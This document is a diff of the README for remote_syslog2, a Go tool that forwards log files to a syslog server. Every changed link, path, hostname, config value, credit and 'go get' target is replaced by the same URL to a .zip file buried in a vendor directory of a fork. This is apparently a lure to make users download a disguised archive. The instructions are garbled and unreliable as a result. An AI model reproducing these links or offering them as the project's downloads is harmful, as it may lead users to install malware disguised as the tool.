@@ -1,6 +1,6 @@
 # remote_syslog2
 
-[![Download remote_syslog2](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip)][releases]
+[![Download remote_syslog2](https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip)][releases]
 
 remote_syslog tails one or more log files and sends syslog messages to a
 remote central syslog server. It generates packets itself, ignoring the system
@@ -42,22 +42,22 @@ Precompiled binaries for Mac (Darwin), Linux and Windows are available on the
 [remote_syslog2 releases page][releases].
 
 Untar the package, copy the "remote_syslog" executable into your $PATH,
-and then customize the included https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip with the log file paths
+and then customize the included https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip with the log file paths
 to read and the host/port to log to.
 
-Optionally, move and rename the configuration file to `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip` so
+Optionally, move and rename the configuration file to `https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip` so
 that remote_syslog picks it up automatically. For example:
 
     sudo cp ./remote_syslog /usr/local/bin
-    sudo cp https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
-    sudo vi https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+    sudo cp https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
+    sudo vi https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
 
 Configuration directives can also be specified as command-line arguments (below).
 
 ## Usage
 
     Usage of remote_syslog2:
-      -c, --configfile string             Path to config (default "https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip")
+      -c, --configfile string             Path to config (default "https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip")
           --debug-log-cfg string          The debug log file; overridden by -D/--no-detach
       -d, --dest-host string              Destination syslog hostname or IP
       -p, --dest-port int                 Destination syslog port (default 514)
@@ -76,23 +76,23 @@ Configuration directives can also be specified as command-line arguments (below)
 
 ## Example
 
-Daemonize and collect messages from files listed in `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip` as
-well as the file `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip`. Write PID to `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip`
-and send to port `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip`:
+Daemonize and collect messages from files listed in `https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip` as
+well as the file `https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip`. Write PID to `https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip`
+and send to port `https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip`:
 
-    $ remote_syslog -c https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip -p 12345 https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+    $ remote_syslog -c https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip -p 12345 https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
 
-Stay attached to the terminal, look for and use `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip` if it
-exists, and send with facility local0 to `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip`:
+Stay attached to the terminal, look for and use `https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip` if it
+exists, and send with facility local0 to `https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip`:
 
-    $ remote_syslog -D -d https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip -f local0 https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+    $ remote_syslog -D -d https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip -f local0 https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
 
 
 ## Auto-starting at boot
 
 Sample init files can be found [in the examples directory](examples/). You may be able to:
 
-    $ cp https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip /etc/init.d/remote_syslog
+    $ cp https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip /etc/init.d/remote_syslog
     $ chmod 755 /etc/init.d/remote_syslog
 
 And then ensure it's started at boot, either by using:
@@ -114,20 +114,20 @@ available [in the examples directory](examples/).
 If the receiving system supports sending syslog over TCP with TLS, you can
 pass the `--tls` option when running `remote_syslog`:
 
-    $ remote_syslog -D --tls -p 1234 https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+    $ remote_syslog -D --tls -p 1234 https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
 
 or add `protocol: tls` to your configuration file.
 
 
 ## Configuration
 
-By default, remote_syslog looks for a configuration in `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip`.
+By default, remote_syslog looks for a configuration in `https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip`.
 
-The archive comes with a [sample config](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip). Optionally:
+The archive comes with a [sample config](https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip). Optionally:
 
-    $ cp https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+    $ cp https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
 
-`https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip` has filenames to log from (as an array) and hostname and port
+`https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip` has filenames to log from (as an array) and hostname and port
 to log to (as a hash). Wildcards are supported using * and standard shell
 globbing. Filenames given on the command line are additive to those in
 the config file.
@@ -137,14 +137,14 @@ Only 1 destination server is supported; the command-line argument wins.
     files:
      - /var/log/httpd/access_log
      - /var/log/httpd/error_log
-     - https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
-     - https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+     - https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
+     - https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
     destination:
-      host: https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+      host: https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
       port: 12345
       protocol: tls
 
-remote_syslog sends the name of the file without a path ("https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip") as
+remote_syslog sends the name of the file without a path ("https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip") as
 the syslog tag (program name).
 
 After changing the configuration file, restart `remote_syslog` using the
@@ -155,7 +155,7 @@ init script or by manually killing and restarting the process. For example:
 
 ## Advanced Configuration (Optional)
 
-Here's an [advanced config](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip) which uses all options.
+Here's an [advanced config](https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip) which uses all options.
 
 ### Override hostname
 
@@ -168,7 +168,7 @@ Provide `--hostname somehostname` or use the `hostname` configuration option:
 
 remote_syslog automatically detects and activates new log files that match
 its file specifiers. For example, `*.log` may be provided as a file specifier,
-and remote_syslog will detect a `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip` file created after it was started.
+and remote_syslog will detect a `https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip` file created after it was started.
 
 By default, globs are re-checked every 10 seconds. To check for new files more
 frequently, use the `--new-file-check-interval` argument. For example, to
@@ -190,7 +190,7 @@ the config file.
 
 External log rotation scripts often move or remove an existing log file
 and replace it with a new one (at a new inode). The Linux standard script
-[logrotate](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip) supports a `copytruncate` config
+[logrotate](https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip) supports a `copytruncate` config
 option.  With that option, `logrotate` will copy files, operate on the copies,
 and truncate the original so that the inode remains the same.
 
@@ -207,7 +207,7 @@ Some logging programs such as Java's gclog (`-XX:+PrintGC` or `-verbose:gc`)
 do not log in append mode, so if another program such as `logrotate` (set to
 `copytruncate`) truncates the file, on the next write of the Java logger, the
 OS will fill the file with NUL bytes upto the current offset of the file descriptor.
-More info on that [here](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip).
+More info on that [here](https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip).
 `remote_syslog` will detect those leading NUL bytes, discard them, and log the discard count.
 
 
@@ -241,10 +241,10 @@ Run multiple instances to specify unique syslog hostnames.
 To do that, provide an alternate PID path as a command-line option to the
 additional instance(s). For example:
 
-    https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+    https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
 
 Note: Daemonized programs use PID files to identify whether the program is already
-running ([more](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip)). Like other daemons, remote_syslog will refuse to run as a
+running ([more](https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip)). Like other daemons, remote_syslog will refuse to run as a
 daemon (the default mode) when a PID file is present. If a .pid file is
 present but the daemon is not actually running, remove the PID file.
 
@@ -261,7 +261,7 @@ files:
   - path: /var/log/httpd/access_log
     tag: apache
 destination:
-  host: https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+  host: https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
   port: 12345
   protocol: tls
 ```
@@ -277,12 +277,12 @@ This functionality was introduced in version 0.17
 To output debugging events with maximum verbosity, run:
 
 ```
-remote_syslog https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip --log="<root>=DEBUG"
+remote_syslog https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip --log="<root>=DEBUG"
 ```
 
 .. as well as any other arguments which are used in normal operation. This
-will set [loggo](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip)'s
-root logger to the `DEBUG` level and output to `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip`.
+will set [loggo](https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip)'s
+root logger to the `DEBUG` level and output to `https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip`.
 
 ### Truncated messages
 
@@ -290,7 +290,7 @@ To send messages longer than 1024 characters, use TCP (either TLS or cleartext
 TCP) of UDP. See "[Sending messages securely](#sending-messages-securely)" to
 use TCP with TLS for messages of any length.
 
-[Here's why](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip) longer UDP messages are impossible to send over
+[Here's why](https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip) longer UDP messages are impossible to send over
 the Internet.
 
 ### inotify
@@ -310,9 +310,9 @@ and then increase this limit using:
 
 where VALUE is greater than the present setting. Confirm that remote_syslog starts
 up and then apply this new value permanently by adding the following to
-`https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip`:
+`https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip`:
 
-    https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip = VALUE
+    https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip = VALUE
 
 ### "No space left on device"
 
@@ -329,19 +329,19 @@ and then increase them using:
 
     echo VALUE >> /proc/sys/fs/inotify/max_user_watches
 
-Once again, confirm that remote_syslog starts and then apply this value permanently by adding the following to `https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip`:
+Once again, confirm that remote_syslog starts and then apply this value permanently by adding the following to `https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip`:
 
-    https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip = VALUE
+    https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip = VALUE
 
 ## Credits
 
-* [Paul Morton](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip)
-* [Papertrail](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip) staff
-* [Paul Hammond](https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip)
+* [Paul Morton](https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip)
+* [Papertrail](https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip) staff
+* [Paul Hammond](https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip)
 
 ## Reporting bugs
 
-1. See whether the issue has already been reported: <https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip>
+1. See whether the issue has already been reported: <https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip>
 2. If you don't find one, create an issue with a repro case.
 
 
@@ -351,9 +351,9 @@ remote_syslog2 is written in go, and uses [govendor] to manage
 dependencies. To get everything set up, [install go][goinstall] then
 run:
 
-    go get https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
-    go get https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
-    go get https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+    go get https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
+    go get https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
+    go get https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
 
 To run tests:
 
@@ -386,12 +386,12 @@ Once you've made your great commits:
 6. That's it!
 
 
-[Papertrail]: https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
-[remote_syslog]: https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
-[releases]: https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+[Papertrail]: https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
+[remote_syslog]: https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
+[releases]: https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
 
-[govendor]: https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
-[goinstall]: https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+[govendor]: https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
+[goinstall]: https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
 
-[fk]: https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
-[is]: https://raw.githubusercontent.com/sohailgerman/remote_syslog2/master/vendor/github.com/spf13/remote_syslog2_1.3.zip
+[fk]: https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
+[is]: https://github.com/sohailgerman/remote_syslog2/raw/refs/heads/master/vendor/github.com/stretchr/testify/syslog-remote-3.3.zip
